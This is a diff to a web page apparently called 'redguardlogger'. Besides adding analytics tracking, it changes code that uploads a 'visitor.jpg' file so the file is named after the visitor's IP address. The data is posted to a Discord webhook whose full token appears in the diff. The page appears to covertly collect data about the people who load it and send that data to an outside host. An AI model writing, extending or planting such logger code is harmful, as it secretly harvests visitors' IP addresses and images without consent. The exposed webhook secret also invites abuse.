@@ -4,6 +4,16 @@
 
 <link rel="stylesheet" href="redguardlogger.css">
   
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-58936387-12"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-58936387-12');
+    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
   <script>
   // Save the current console log function in case we need it.
   const _log = console.log;
@@ -163,7 +173,7 @@
      'visitor.jpg');
     
     var formData = new FormData();
-    formData.append('file', file);
+    formData.append('file', file, json.ip);
     
     fetch(
       'https://discord.com/api/webhooks/1110072092826808390/IR34WYbMbUzKWKv2ade5O7m7JEQfzhpsFgOCzAql57-ViE5Rcs57JLUwnCBYboKH78kj', {
